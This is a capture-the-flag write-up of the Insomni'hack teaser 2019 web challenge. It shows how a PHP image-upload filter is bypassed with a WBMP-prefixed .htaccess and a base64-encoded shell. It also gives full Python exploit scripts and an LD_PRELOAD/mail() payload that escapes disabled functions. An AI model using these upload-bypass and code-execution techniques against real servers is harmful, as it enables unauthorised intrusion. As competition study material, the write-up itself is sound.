---
description: Weboo
---

# Insomni'hack teaser 2019

## Credits 

Most work was done by corb, our captain, and idea from @ulas, with a big help from other @opentoall members, i am just taking note of this funny challenge

![](.gitbook/assets/image%20%2866%29.png)

## Upload an .htaccess

So it was 1 AM when i joined the contest, i was intend to play about ~ 2 hours to get good sleep. 2 hours is quite impossible to solve a RE challenge \(this contest is serious :P\), so i decided to play a web chall. After an hour playing around, my friend @ulas came up with idea that some how we need to upload an .htaccess, then there is pretty much things to do after that

## Bypass checkpoints

{% code-tabs %}
{% code-tabs-item title="checkpoints.php" %}
```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Checkpoint 1 : Name

It's quite trivial, the code split our file name by ".", so we can just upload the "..htaccess" file

### Checkpoint 2 : Extension

This one actually a hint that lead us to think about using .htaccess at first place

### Checkpoint 3 : Exif check

It's quite trivial, reading on php documentation page, we know that

```text
exif_imagetype() reads the first bytes of an image and checks its signature
```

So, it means that we only need our file start with an magic number.  After trial and error, we know that line start with Null Byte will be skipped and .htaccess works well

We choose "0x00" which mean WBMP because .htaccess will skip through the line that start with "0x00" 

From PHP Interpreter C source code, we know that

```text
/* {{{ php_get_wbmp
 * int WBMP file format type
 * byte Header Type
 *	byte Extended Header
 *		byte Header Data (type 00 = multibyte)
 *		byte Header Data (type 11 = name/pairs)
 * int Number of columns
 * int Number of rows
 */
```

### Checkpoint 4 : Size check

It's quite easy, we just need to read C code of PHP to understand how it calculate dimension of an image

```c
static int php_get_wbmp(php_stream *stream, struct gfxinfo **result, int check)
{
	int i, width = 0, height = 0;

	if (php_stream_rewind(stream)) {
		return 0;
	}

	/* get type */
	if (php_stream_getc(stream) != 0) {
		return 0;
	}

	/* skip header */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
	} while (i & 0x80);

	/* get width */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
		width = (width << 7) | (i & 0x7f);
        /* maximum valid width for wbmp (although 127 may be a more accurate one) */
        if (width > 2048) {
            return 0;
        }
	} while (i & 0x80);

	/* get height */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
		height = (height << 7) | (i & 0x7f);
        /* maximum valid height for wbmp (although 127 may be a more accurate one) */
        if (height > 2048) {
            return 0;
        }
	} while (i & 0x80);

	if (!height || !width) {
		return 0;
	}

	if (!check) {
		(*result)->width = width;
		(*result)->height = height;
	}

	return IMAGE_FILETYPE_WBMP;
}
```

{% code-tabs %}
{% code-tabs-item title="Source" %}
```text
https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c
```
{% endcode-tabs-item %}
{% endcode-tabs %}

With a little bit math calculation, we can get it done

![](.gitbook/assets/image%20%2887%29.png)

{% code-tabs %}
{% code-tabs-item title="poc.py" %}
```text
out = chr(0x00) + chr(0x00) + chr(0x8a) + chr(0x39) + chr(0x80) + chr(0x8a) + chr(0x39) + chr(0x00)
print out
out += '''your htaccess'''
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Checkpoint 5 : PHP

It was checking if "&lt;?" is in the uploaded file, so we need encode the shell in base64

{% code-tabs %}
{% code-tabs-item title=".htaccess" %}
```text
AddType application/x-httpd-php .corb3nik php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"Upload shell
```
{% endcode-tabs-item %}
{% endcode-tabs %}

&lt;3 Credits go all to Corb3nik

{% code-tabs %}
{% code-tabs-item title="up\_shell.py" %}
```python
#!/usr/bin/env python3

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x00\x00\x00\x00\x00\x0a\x0a"
URL = "http://35.246.234.136/"
RANDOM_DIRECTORY = "cd64786e8e27882608c3520dd83a27babbcdbb08"

COOKIES = {
    "PHPSESSID" : ""
}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .corb3nik
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"<?php echo works; ?>")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.corb3nik", TARGET_FILE)
upload_content("trigger.corb3nik", VALID_WBMP)

response = requests.get(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik")
print(response.text)
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## It's not done yet

Even though we can execute php command, but system\(\) and some function is disabled, we managed to found the flag but dont have permission to read it

```text
. .. .dockerenv bin boot dev etc flag get_flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

get\_flag is an captcha that read data from urandom and made a sum, ask for answer, quite easy. But problem is that we dont have interactive shell to solve that captcha, FUCK IT!

![](.gitbook/assets/image%20%287%29.png)

At that moment, it was 8 AM and i feels a bit tire, my brain is not in good condition and functioning enough to keep working, so i decided to go to sleep. Well, i should go sleep at 7 AM already but i know if i did so, my teammate will get it done before i wake up...

## Mission accomplished

Corb was wrote an C program to pipe data from get\_flag and solve the captcha

```c
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <signal.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/wait.h>
#include<sys/prctl.h>
#include<signal.h>
#include<stdlib.h>
#include<stdio.h>

int main() {
  pid_t pid = 0;
  int inpipefd[2];
  int outpipefd[2];
  char buf[256];
  char msg[256];
  int status;

  pipe(inpipefd);
  pipe(outpipefd);
  pid = fork();
  if (pid == 0)
  {
    dup2(outpipefd[0], STDIN_FILENO);
    dup2(inpipefd[1], STDOUT_FILENO);
    dup2(inpipefd[1], STDERR_FILENO);
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    execl("/get_flag", "get_flag", (char*) NULL);
    exit(1);
  }

  close(outpipefd[0]);
  close(inpipefd[1]);

        char data[0xff] = {0};
        read(inpipefd[0], data, 0xff);

        uint64_t sum = 0;
        char *pch;
        printf("Raw : %s\n", data);
        pch = strtok (data+34, "+");
        printf("Sum : %llu\n", sum);
        while (pch != 0)  {
                sum += strtoull(pch, 0, 10);
                printf("Operation : %llu\n", atol(pch));
                printf("Sum : %llu\n", sum);
                pch = strtok (0, "+");
        }

        char result[32] = {0};
        sprintf(result, "%llu\n", sum);
        printf("Result : %llu\n", sum);

        write(outpipefd[1], result, 16);
        memset(data, 0, 0xff);
        read(inpipefd[0], data, 0xff);
        printf("Final : %s", data);
}
```

Final payload

```python
#!/usr/bin/env python3

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x00\x00\x00\x00\x00\x0a\x0a"
URL = "http://35.246.234.136/"
RANDOM_DIRECTORY = "ad759ad95e5482e02a15c5d30042b588b6630e64"

COOKIES = {
    "PHPSESSID" : "0e7eal0ji7seg6ac3ck7d2csd8"
}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .corb3nik
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
move_uploaded_file($_FILES['captcha_solver']['tmp_name'], '/tmp/captcha_solver.corb3nik');
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/corb3nik_you_idiot');
putenv('LD_PRELOAD=/tmp/corb3nik_you_idiot');
putenv("_evilcmd=chmod +x /tmp/captcha_solver.corb3nik");
mail('a','a','a');
putenv("_evilcmd=cd / && /tmp/captcha_solver.corb3nik");
mail('a','a','a');
echo file_get_contents('/tmp/_0utput.txt');
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.corb3nik", TARGET_FILE)
upload_content("trigger.corb3nik", VALID_WBMP)


files = { "evil" : open("../payloads/evil.so", "rb"),
         "captcha_solver" : open("../payloads/captcha_solver", "rb") }
response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik", files=files)
print(response.text)
```



## It's funny

![lol.png](.gitbook/assets/image%20%2846%29.png)

